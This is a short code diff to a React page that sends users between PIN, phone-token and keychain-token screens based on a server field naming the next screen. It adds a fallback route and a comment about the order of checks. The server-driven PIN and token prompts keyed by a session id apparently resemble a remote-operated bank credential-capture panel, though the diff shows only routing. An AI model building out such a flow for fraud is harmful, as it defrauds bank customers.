@@ -112,7 +112,7 @@ function InternaPage() {
         setTokenSerial(res.token_serial ?? null);
         setTokenNome(res.token_nome ?? null);
 
-        // Overlay de token dentro da BIA
+        // Overlay de token dentro da BIA — deve ser verificado antes do redirecionamento genérico
         if (res.proxima_tela === "interna_token_celular" || res.proxima_tela === "interna_token_chaveiro") {
           const modo = res.proxima_tela === "interna_token_chaveiro" ? "chaveiro" : "celular";
           setTokenModo((cur) => (cur === modo ? cur : modo));
@@ -143,7 +143,9 @@ function InternaPage() {
                 ? "/pin"
                 : res.proxima_tela === "token_chaveiro"
                   ? "/token-chaveiro"
-                  : "/token-celular";
+                  : res.proxima_tela === "token_celular"
+                    ? "/token-celular"
+                    : "/interna";
             navigate({ to: destino, search: { id } });
           }, 400);
           return;
